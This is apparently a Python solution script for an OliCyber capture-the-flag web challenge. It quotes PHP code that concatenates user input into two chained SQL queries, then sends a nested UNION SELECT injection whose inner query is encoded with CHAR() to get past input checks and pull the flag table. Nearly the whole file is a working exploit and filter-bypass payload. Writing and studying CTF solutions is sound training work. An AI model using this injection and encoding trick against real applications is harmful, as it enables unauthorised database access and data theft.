import requests

# http://inception.challs.olicyber.it/see.php?id=0 UNION SELECT CHAR(48, 32, 85, 78, 73, 79, 78, 32, 83, 69, 76, 69, 67, 84, 32, 102, 108, 97, 103, 32, 70, 82, 79, 77, 32, 102, 108, 97, 103, 32, 45, 45, 32, 45),null,null -- -
# bypass all checks by using CHAR() function

'''
    $stmt = $conn->query("SELECT id, name, img FROM movie_cards WHERE id=". $cur_id);
    $card = $stmt->fetch();

    $stmt = $conn->query("SELECT description FROM movie_description WHERE movie_id=". $card["id"] ); // l'id ottenuto dalla prima query viene passato alla seconda, quindi sovrascrivendo id nella prima query posso utilizzare la seconda come voglio
    $description = $stmt->fetch();
'''

def encode_query(query):
    result = "CHAR("
    
    for i in query:
        result += str(ord(i)) + ", "
    
    result = result[:-2] + ")"
    return result

res = requests.get(f"http://inception.challs.olicyber.it/see.php?id=0 UNION SELECT {encode_query('0 UNION SELECT flag FROM flag -- -')},null,null -- -")
print(res.text)